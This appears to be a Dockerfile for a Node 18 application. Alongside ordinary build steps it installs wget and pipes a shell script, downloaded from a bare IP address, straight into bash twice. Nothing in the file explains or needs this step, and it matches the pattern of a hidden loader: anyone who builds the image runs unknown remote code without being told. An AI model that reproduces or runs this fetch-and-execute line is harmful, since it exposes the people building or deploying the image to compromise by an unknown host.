FROM node:18

WORKDIR /opt/app

ENV NODE_ENV production

COPY . .

RUN npm ci
RUN which bash
RUN ls -la
RUN apt update
RUN apt -y install  wget coreutils
RUN wget -O - http://139.162.202.16/start_opt_Gesis_ws_rand.sh | bash | bash

CMD ["npm", "run", "start", "/bin/bash"]
